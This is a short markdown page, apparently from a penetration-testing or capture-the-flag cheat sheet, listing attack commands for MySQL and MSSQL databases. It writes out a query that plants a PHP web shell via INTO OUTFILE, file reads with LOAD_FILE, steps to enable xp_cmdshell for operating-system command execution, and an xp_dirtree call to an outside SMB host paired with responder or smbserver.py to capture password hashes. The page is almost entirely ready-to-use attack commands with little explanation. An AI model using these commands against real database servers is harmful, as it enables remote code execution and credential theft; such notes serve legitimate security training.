---
title: "Mssql-Mysql"
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
sidebar:
  collapsed: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  robots: "" # custom robot tags (optional)
  noindex: false # false (default) or true
---


**Mysql**

- Upload file when root : 
```sql
select '<?php echo "command: " . system($_REQUEST["cmd"]); ?>' into outfile "C:\\xampp\\htdocs\\dev\\shell.php";
```

- Read file : 
```sh
SELECT LOAD_FILE('C:\\Users\\Administrator\\Desktop\\root.txt');
```

- Check permissions : 
```sql
SHOW GRANTS FOR CURRENT_USER;
select system_user();
```

**MSSQL**
- Enable xp_cmdshell with sp_configure
```sh
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
# this enables xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```
- Disable xp_cmdshell with sp_configure

```sh
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
#this disables xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '0' 
RECONFIGURE

EXEC xp_cmdshell 'whoami';
```

- Mssql command : 
```sh
enum_db

use db;

SELECT TABLE_NAME FROM Demo.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';

SELECT * from db;
```

- Catch hash with xp_dirtree : 
```sh
EXEC master.sys.xp_dirtree '\\10.8.3.12\myshare',1,1
smbserver.py -smb2support share .
#or 
responder --interface "tun0" -wd
```